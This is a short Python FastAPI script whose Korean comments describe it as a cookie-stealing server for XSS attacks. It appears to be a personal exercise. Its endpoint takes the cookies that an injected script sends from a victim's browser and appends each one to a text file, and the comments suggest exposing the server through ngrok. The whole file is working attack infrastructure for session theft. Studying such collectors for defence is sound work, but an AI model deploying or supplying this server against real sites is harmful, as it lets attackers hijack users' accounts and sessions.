# 쿠키 탈취 웹 서버
# XSS 취약점을 이용해 쿠키를 포함한 요청을 웹 서버로 보낼 때 이를 받아봄

# 피해자가 http://hostname/cookie/cookies 경로로 XSS 취약점을 이용해 실행하도록 작업을 추가
# ngrok : 외부에서도 내부를 바라볼 수 있도록 proxy 환경을 간편하게 구성해줌.
#   신기함 https://ngrok.com 참조
import uvicorn
from fastapi import FastAPI

app = FastAPI()
cookie_path = "./cookies.txt"

@app.get("/")
async def home():
    return {"Like": "Cookie"}

@app.get("/cookies/{cookie}")
async def harvest_cookie(cookie: str):
    with open(cookie_path, "a+") as f:
        f.write(cookie+ "\n")
        return {"cookie": cookie}

if __name__ == '__main__':
    uvicorn.run("ex2:app", host="0.0.0.0", port=80, reload=True)
    

# https://github.com/whackur/simple-1px-ip-tracker